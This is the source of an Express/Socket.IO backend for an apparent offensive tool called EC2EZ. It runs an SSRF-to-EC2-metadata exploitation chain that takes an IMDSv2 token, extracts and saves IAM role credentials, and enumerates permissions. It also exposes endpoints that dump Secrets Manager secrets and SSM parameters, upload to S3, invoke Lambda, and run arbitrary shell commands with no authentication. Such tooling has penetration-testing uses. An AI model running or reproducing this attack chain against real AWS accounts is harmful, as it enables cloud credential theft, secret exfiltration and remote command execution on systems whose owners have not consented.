import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

// Import EC2EZ modules
import * as imds from '../src/imds.js';
import * as aws from '../src/aws.js';
import * as permissions from '../src/permissions.js';
import * as s3discovery from '../src/s3discovery.js';
import { SessionSummary } from '../src/summary.js';
import { CONFIG } from '../src/config.js';
import { extractSSRFParam } from '../src/utils.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
  },
});

app.use(cors());
app.use(express.json());

// Session state
let currentSession = {
  summary: new SessionSummary(),
  proxyUrl: null,
  token: null,
  roles: [],
  permissions: null,
};

// Helper function to emit logs to UI
function emitLog(type, message, data = null) {
  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
  io.emit('log', { type, message, data, timestamp });
  console.log(`[${timestamp}] [${type.toUpperCase()}] ${message}`);
  if (data) {
    console.log(`[${timestamp}] [DATA]`, JSON.stringify(data, null, 2));
  }
}

// Start exploitation flow
app.post('/api/start', async (req, res) => {
  const { proxyUrl } = req.body;

  if (!proxyUrl) {
    return res.status(400).json({ error: 'Proxy URL is required' });
  }

  res.json({ status: 'started' });

  try {
    currentSession = {
      summary: new SessionSummary(),
      proxyUrl,
      token: null,
      roles: [],
      permissions: null,
    };

    // Auto-detect SSRF parameter name (same as CLI)
    emitLog('info', 'Starting exploitation flow...');
    emitLog('info', `Received proxy URL: ${proxyUrl}`);
    const paramName = extractSSRFParam(proxyUrl);
    CONFIG.ssrf.paramName = paramName;
    emitLog('info', `Auto-detected SSRF parameter name: ${paramName}`);

    io.emit('sessionUpdate', { proxyUrl });

    // Step 1: Test SSRF
    emitLog('info', 'Step 1: Testing SSRF vulnerability...');
    const testUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/`;
    const fullTestUrl = `${proxyUrl}${proxyUrl.includes('?') ? '' : '?'}${CONFIG.ssrf.paramName}=${encodeURIComponent(testUrl)}`;
    emitLog('info', `Target IMDS endpoint: ${testUrl}`);
    emitLog('info', `Full constructed URL: ${fullTestUrl}`);

    try {
      emitLog('info', 'Sending SSRF test request...');
      const isVulnerable = await imds.testSSRFVulnerability(proxyUrl);
      if (!isVulnerable) {
        emitLog('error', '✗ SSRF test failed - proxy not vulnerable or unreachable');
        emitLog('warning', '⚠ Possible issues: Proxy server not running, cannot reach 169.254.169.254, or wrong parameter');
        emitLog('info', 'Verify proxy can make requests to 169.254.169.254');
        io.emit('exploitationComplete');
        return;
      }
      emitLog('success', '✓ SSRF vulnerability confirmed');
      emitLog('info', 'Proxy is responding correctly to IMDS requests');
    } catch (error) {
      emitLog('error', `✗ SSRF test error: ${error.message}`);
      emitLog('info', `Error stack: ${error.stack || 'No stack trace available'}`);
      io.emit('exploitationComplete');
      return;
    }

    // Step 2: Extract IMDSv2 Token
    emitLog('info', 'Step 2: Extracting IMDSv2 token...');
    emitLog('info', 'Sending PUT request to token endpoint...');
    const token = await imds.fetchIMDSv2Token(proxyUrl);
    if (!token) {
      emitLog('error', '✗ Failed to extract IMDSv2 token');
      emitLog('warning', '⚠ Cannot proceed without valid IMDSv2 token');
      io.emit('exploitationComplete');
      return;
    }
    currentSession.token = token;
    emitLog('success', '✓ IMDSv2 token extracted successfully');
    emitLog('info', `Token TTL: 6 hours (21600 seconds)`);
    emitLog('info', `Token length: ${token.length} characters`);
    currentSession.summary.setIMDS({ token, totalMetadata: 0 });

    // Step 3: Enumerate IAM Roles
    emitLog('info', 'Step 3: Enumerating IAM roles...');
    emitLog('info', 'Querying /latest/meta-data/iam/security-credentials endpoint...');
    const roles = await imds.fetchAllIAMRoles(proxyUrl, token);
    if (!roles || roles.length === 0) {
      emitLog('warning', '⚠ No IAM roles found on instance');
      emitLog('info', 'This instance may not have an IAM instance profile attached');
    } else {
      emitLog('success', `✓ Found ${roles.length} IAM role(s)`);
      emitLog('info', `Roles: ${roles.join(', ')}`);
      currentSession.roles = roles;
    }

    // Step 4: Extract credentials for each role
    emitLog('info', 'Step 4: Extracting credentials for all roles...');
    for (const role of roles) {
      emitLog('info', `Processing role: ${role}`);
      emitLog('info', `Requesting credentials from /latest/meta-data/iam/security-credentials/${role}`);
      const creds = await imds.fetchCredentials(proxyUrl, token, role);

      if (creds) {
        emitLog('success', `✓ Credentials extracted for ${role}`);
        emitLog('info', `Access Key ID: ${creds.AccessKeyId}`);
        emitLog('info', `Expiration: ${creds.Expiration}`);
        currentSession.summary.addRole({
          name: role,
          accessKeyId: creds.AccessKeyId,
          secretAccessKey: creds.SecretAccessKey,
          token: creds.Token,
          expiration: creds.Expiration,
        });

        // Write credentials to file
        emitLog('info', 'Writing credentials to ~/.aws/credentials...');
        await imds.writeAWSCredentials(
          creds.AccessKeyId,
          creds.SecretAccessKey,
          creds.Token,
          CONFIG.aws.defaultRegion
        );
        emitLog('info', 'Credentials written successfully');

        // Validate credentials
        emitLog('info', 'Validating credentials with AWS STS...');
        emitLog('info', 'Running: aws sts get-caller-identity');
        const validation = await aws.validateCredentials(true);
        if (validation.valid) {
          emitLog('success', `✓ Credentials valid`);
          emitLog('info', `Account ID: ${validation.accountId}`);
          emitLog('info', `Region: ${validation.region}`);
          emitLog('info', `ARN: ${validation.arn || 'N/A'}`);
          currentSession.summary.setCredentials({
            extracted: true,
            valid: true,
            roleName: role,
            region: validation.region,
            accountId: validation.accountId,
          });

          io.emit('sessionUpdate', {
            accountId: validation.accountId,
            region: validation.region,
          });
        } else {
          emitLog('warning', '⚠ Credential validation failed');
        }
      } else {
        emitLog('error', `✗ Failed to extract credentials for ${role}`);
      }
    }

    // Step 5: Enumerate IMDS metadata
    emitLog('info', 'Step 5: Enumerating IMDS metadata...');
    emitLog('info', 'Recursively crawling /latest/meta-data endpoint...');
    const metadata = await s3discovery.enumerateIMDSRecursive(proxyUrl, token, '/latest/meta-data');
    const metadataCount = Object.keys(metadata).length;
    emitLog('success', `✓ Discovered ${metadataCount} metadata entries`);
    emitLog('info', 'Metadata includes: instance-id, instance-type, placement, tags, user-data, etc.');
    currentSession.summary.setIMDS({ token, totalMetadata: metadataCount });

    // Step 6: Enumerate permissions
    emitLog('info', 'Step 6: Enumerating IAM permissions...');
    emitLog('info', 'Testing common AWS API calls to discover granted permissions...');
    const permResults = await permissions.discoverPermissionsByTesting();
    currentSession.permissions = permResults;
    emitLog('success', `✓ Discovered ${permResults.totalPermissions} permissions`);
    emitLog('info', `Permissions by service: ${Object.keys(permResults.permissionsByService).length} services`);
    if (permResults.dangerousPermissionsList && permResults.dangerousPermissionsList.length > 0) {
      emitLog('warning', `⚠ Found ${permResults.dangerousPermissionsList.length} dangerous permissions`);
      emitLog('info', `Dangerous permissions: ${permResults.dangerousPermissionsList.join(', ')}`);
    }
    currentSession.summary.setPermissions({
      total: permResults.totalPermissions,
      discovered: permResults.allPermissions,
      dangerous: permResults.dangerousPermissionsList,
    });

    io.emit('sessionUpdate', {
      roles: currentSession.roles,
      permissions: permResults,
      metadata: metadataCount,
    });

    // Step 7: Test S3 access
    emitLog('info', 'Step 7: Testing S3 access...');
    emitLog('info', 'Running: aws s3api list-buckets');
    try {
      const s3Results = await s3discovery.testS3Access();
      if (s3Results.buckets && s3Results.buckets.length > 0) {
        emitLog('success', `✓ Found ${s3Results.buckets.length} accessible S3 buckets`);
        emitLog('info', `S3 buckets: ${s3Results.buckets.join(', ')}`);
        io.emit('sessionUpdate', {
          s3Buckets: s3Results.buckets,
        });
      } else {
        emitLog('info', 'No S3 buckets found or no s3:ListAllMyBuckets permission');
      }
    } catch (error) {
      emitLog('warning', '⚠ S3 access test failed');
      emitLog('info', `Error: ${error.message}`);
    }

    emitLog('success', '✓ Exploitation complete! All steps finished successfully.');
    emitLog('info', 'You can now use the action buttons to explore AWS resources.');
    io.emit('exploitationComplete');
  } catch (error) {
    emitLog('error', `✗ Exploitation failed: ${error.message}`);
    emitLog('info', `Error stack: ${error.stack || 'No stack trace available'}`);
    io.emit('exploitationComplete');
  }
});

// S3 Operations
app.get('/api/s3/buckets', async (req, res) => {
  try {
    console.log('[API] GET /api/s3/buckets - Listing S3 buckets');
    const buckets = await aws.listS3Buckets();
    console.log(`[API] Found ${buckets.length} S3 buckets`);
    res.json({ buckets });
  } catch (error) {
    console.error(`[API ERROR] Failed to list S3 buckets: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/s3/list-objects', async (req, res) => {
  try {
    const { bucket, prefix } = req.body;
    const objects = await aws.listS3Objects(bucket, prefix);
    res.json({ objects });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/s3/download', async (req, res) => {
  try {
    const { bucket, key, outputPath } = req.body;
    await aws.downloadS3Object(bucket, key, outputPath);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/s3/upload', async (req, res) => {
  try {
    const { localPath, bucket, key } = req.body;
    await aws.uploadS3Object(localPath, bucket, key);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Secrets Manager Operations
app.get('/api/secrets/list', async (req, res) => {
  try {
    console.log('[API] GET /api/secrets/list - Listing Secrets Manager secrets');
    const secrets = await aws.listSecrets();
    console.log(`[API] Found ${secrets.length} secrets`);
    res.json({ secrets });
  } catch (error) {
    console.error(`[API ERROR] Failed to list secrets: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/secrets/get', async (req, res) => {
  try {
    const { secretName } = req.body;
    const value = await aws.getSecretValue(secretName);
    res.json({ value });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// SSM Operations
app.get('/api/ssm/parameters', async (req, res) => {
  try {
    console.log('[API] GET /api/ssm/parameters - Listing SSM parameters');
    const parameters = await aws.listSSMParameters();
    console.log(`[API] Found ${parameters.length} SSM parameters`);
    res.json({ parameters });
  } catch (error) {
    console.error(`[API ERROR] Failed to list SSM parameters: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/ssm/get-parameter', async (req, res) => {
  try {
    const { paramName } = req.body;
    console.log(`[API] POST /api/ssm/get-parameter - Getting parameter: ${paramName}`);
    const value = await aws.getSSMParameter(paramName);
    console.log(`[API] Retrieved SSM parameter value`);
    res.json({ value });
  } catch (error) {
    console.error(`[API ERROR] Failed to get SSM parameter: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/ssm/put-parameter', async (req, res) => {
  try {
    const { paramName, value, paramType } = req.body;
    console.log(`[API] POST /api/ssm/put-parameter - Creating parameter: ${paramName} (type: ${paramType})`);
    await aws.createSSMParameter(paramName, value, paramType);
    console.log(`[API] SSM parameter created successfully`);
    res.json({ success: true });
  } catch (error) {
    console.error(`[API ERROR] Failed to create SSM parameter: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// IAM Operations
app.get('/api/iam/users', async (req, res) => {
  try {
    console.log('[API] GET /api/iam/users - Listing IAM users');
    const users = await aws.listIAMUsers();
    console.log(`[API] Found ${users.length} IAM users`);
    res.json({ users });
  } catch (error) {
    console.error(`[API ERROR] Failed to list IAM users: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/iam/roles', async (req, res) => {
  try {
    console.log('[API] GET /api/iam/roles - Listing IAM roles');
    const roles = await aws.listIAMRoles();
    console.log(`[API] Found ${roles.length} IAM roles`);
    res.json({ roles });
  } catch (error) {
    console.error(`[API ERROR] Failed to list IAM roles: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// Lambda Operations
app.get('/api/lambda/functions', async (req, res) => {
  try {
    console.log('[API] GET /api/lambda/functions - Listing Lambda functions');
    const functions = await aws.listLambdaFunctions();
    console.log(`[API] Found ${functions.length} Lambda functions`);
    res.json({ functions });
  } catch (error) {
    console.error(`[API ERROR] Failed to list Lambda functions: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/lambda/invoke', async (req, res) => {
  try {
    const { functionName, payload } = req.body;
    console.log(`[API] POST /api/lambda/invoke - Invoking function: ${functionName}`);
    const result = await aws.invokeLambda(functionName, payload);
    console.log(`[API] Lambda invocation completed`);
    res.json({ result });
  } catch (error) {
    console.error(`[API ERROR] Failed to invoke Lambda: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// EC2 Operations
app.get('/api/ec2/instances', async (req, res) => {
  try {
    console.log('[API] GET /api/ec2/instances - Listing EC2 instances');
    const instances = await aws.listEC2Instances();
    console.log(`[API] Found ${instances.length} EC2 instances`);
    res.json({ instances });
  } catch (error) {
    console.error(`[API ERROR] Failed to list EC2 instances: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/ec2/launch', async (req, res) => {
  try {
    console.log('[API] POST /api/ec2/launch - Launching EC2 instance');
    const instance = await aws.launchEC2Instance();
    console.log(`[API] EC2 instance launched successfully`);
    res.json({ instance });
  } catch (error) {
    console.error(`[API ERROR] Failed to launch EC2 instance: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// CloudWatch Operations
app.get('/api/cloudwatch/log-groups', async (req, res) => {
  try {
    console.log('[API] GET /api/cloudwatch/log-groups - Listing CloudWatch log groups');
    const { listLogGroups } = await import('../src/cloudwatch.js');
    const logGroups = await listLogGroups();
    console.log(`[API] Found ${logGroups.length} CloudWatch log groups`);
    res.json({ logGroups });
  } catch (error) {
    console.error(`[API ERROR] Failed to list CloudWatch log groups: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/cloudwatch/scan', async (req, res) => {
  try {
    const { logGroupName, hours, maxLogs } = req.body;
    const { scanCloudWatchLogs } = await import('../src/cloudwatch.js');
    const results = await scanCloudWatchLogs(logGroupName, hours, maxLogs);
    res.json({ results });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Shell command execution
app.post('/api/shell/exec', async (req, res) => {
  try {
    const { command } = req.body;
    console.log(`[API] POST /api/shell/exec - Executing command: ${command}`);

    const { exec } = await import('child_process');
    const { promisify } = await import('util');
    const execAsync = promisify(exec);

    const { stdout, stderr } = await execAsync(command);
    console.log(`[API] Command executed successfully`);

    res.json({
      output: stdout || stderr,
      stdout,
      stderr
    });
  } catch (error) {
    console.error(`[API ERROR] Shell command failed: ${error.message}`);
    res.status(500).json({ error: error.message, output: error.stdout || error.stderr });
  }
});

// Bulk secret extraction
app.post('/api/bulk/extract-secrets', async (req, res) => {
  try {
    console.log('[API] POST /api/bulk/extract-secrets - Starting bulk extraction');
    const { extractAllSecrets } = await import('../src/aws.js');
    const summary = await extractAllSecrets();
    console.log(`[API] Bulk extraction completed`);
    res.json({ summary });
  } catch (error) {
    console.error(`[API ERROR] Bulk extraction failed: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

// Get session summary
app.get('/api/summary', (req, res) => {
  res.json({
    summary: currentSession.summary.findings,
  });
});

// WebSocket connection
io.on('connection', (socket) => {
  const clientId = socket.id.substring(0, 8);
  console.log(`[WEBSOCKET] Client connected - ID: ${clientId}`);
  socket.emit('log', {
    type: 'info',
    message: 'Connected to EC2EZ server',
    timestamp: new Date().toISOString().split('T')[1].split('.')[0],
  });

  socket.on('disconnect', () => {
    console.log(`[WEBSOCKET] Client disconnected - ID: ${clientId}`);
  });
});

const PORT = process.env.PORT || 3006;
httpServer.listen(PORT, () => {
  console.log('========================================');
  console.log('EC2EZ Server Started');
  console.log('========================================');
  console.log(`Server URL: http://localhost:${PORT}`);
  console.log(`API Endpoints: http://localhost:${PORT}/api/*`);
  console.log(`WebSocket: ws://localhost:${PORT}`);
  console.log('========================================');
  console.log('Ready to accept connections...');
  console.log('========================================');
});
